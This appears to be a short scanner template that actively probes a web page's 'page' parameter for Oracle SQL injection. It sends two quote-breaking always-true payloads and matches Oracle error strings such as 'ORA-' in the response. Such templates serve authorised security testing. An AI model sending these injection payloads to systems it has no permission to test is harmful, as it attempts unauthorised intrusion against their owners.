id: sqli6-oracle-27
name: 'SQLi oracle probe in page'
severity: high
type: active
tags:
  - sqli
  - injection
  - oracle
description: 'Triggers oracle error via page'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      page:
        - '''||''1''=''1'
        - ''' OR ''1''=''1'
    matchers:
      - type: regex
        part: body
        regex:
          - 'ORA-'
          - 'Oracle error'
